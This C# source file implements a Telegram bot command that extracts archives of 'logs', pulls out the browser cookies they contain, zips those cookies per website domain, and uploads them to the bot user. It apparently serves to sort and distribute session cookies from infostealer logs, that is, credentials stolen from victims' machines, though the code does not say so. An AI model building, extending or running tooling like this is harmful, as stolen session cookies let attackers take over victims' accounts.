using System.Net;
using Core.Models.Configs;
using Core.Models.Extensions;
using Core.Parsers;
using Microsoft.EntityFrameworkCore;
using TelegramBot.Data;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

using File = TelegramBot.Data.File;
using User = TL.User;

namespace TelegramBot.Commands.Main;

public class CookiesCommand(Client client, AppDbContext context, ParsingConfig cfgParse, DataService data) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    public Task Invoke(UpdateNewMessage update, User user) =>
        client.SendAvailableLogs(user, "Cookies\nSelect logs", data);

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
            { } logsname) return;
        
        // TODO extract into method

        if (await TrySendUploadedAsync(user, logsname))
            return;

        await ProcessArchive(update.msg_id, user, logsname, null);
    }

    private async Task<bool> TrySendUploadedAsync(InputPeer peer, string logsname)
    {
        var uploaded = context.Files!
               .Where(x => x.LogsName == logsname)
               .Where(x => x.Category == "Cookies");

        if (!await uploaded.AnyAsync())
            return false;

        await client.SendAlbumAsync(
            peer,
            await uploaded
                  .Select(x => (InputMedia) new InputDocument
                  {
                      id = x.Id,
                      access_hash = x.AccessHash,
                      file_reference = x.FileReference
                  })
                  .ToListAsync(),
            caption: $"#Cookies\n{logsname}",
            entities: 
            [
                new MessageEntityHashtag
                {
                    length = "#Cookies".Length,
                    offset = 0
                }
            ]
        );

        return true;
    }

    private async Task ProcessArchive(int messageId, InputPeer peer, string logsname, string? password)
    {
        await client.EditMessage(peer, messageId, $"Cookies\nStart parsing cookies from {logsname}");
        
        if (data.GetLogsPath(logsname) is not { } zippath ||
            data.ExtractFiles(zippath, password) is not { } dir)
        {
            dir = data.GetExtractedPath(logsname);

            if (!Directory.Exists(dir)) return;
        }

        var files = await ParseCookies(dir).ToListAsync();
        
        await client.EditMessage(peer, messageId, $"Cookies\n{logsname} successfully processed");
        
        var messages = await client.SendAlbumAsync(peer,
            files
                .Select(x => new InputMediaUploadedDocument(x, "application/zip"))
                .ToArray(),
            caption: $"#Cookies\n{logsname}",
            entities: 
            [
                new MessageEntityHashtag
                {
                    length = "#Cookies".Length,
                    offset = 0
                }
            ]
        );

        await SaveFilesData(messages, logsname);
    }

    private IAsyncEnumerable<InputFileBase> ParseCookies(string logs) =>
        cfgParse.Cookies.CookiesFromLogs(logs)
                .ToAsyncEnumerable()
                .SelectAwait(async x => 
                    await data.SaveZipAsync(
                        new DirectoryInfo(logs).Name,
                        "cookies",
                        x.Key.Domains.First(),
                        x.Value.ToArray(),
                        "Cookies"))
                .SelectAwait(async path => await client.UploadFileAsync(path));

    private async Task SaveFilesData(Message[] messages, string logsname)
    {
        var medias = messages
                     .Select(x => (MessageMediaDocument)x.media)
                     .Select(x => (Document)x.document);

        await context.AddRangeAsync(medias.Select(x => new File
        {
            Id = x.id,
            AccessHash = x.access_hash,
            FileReference = x.file_reference,
            Type = x.Filename,
            Category = "Cookies",
            LogsName = logsname
        }));

        await context.SaveChangesAsync();
    }
}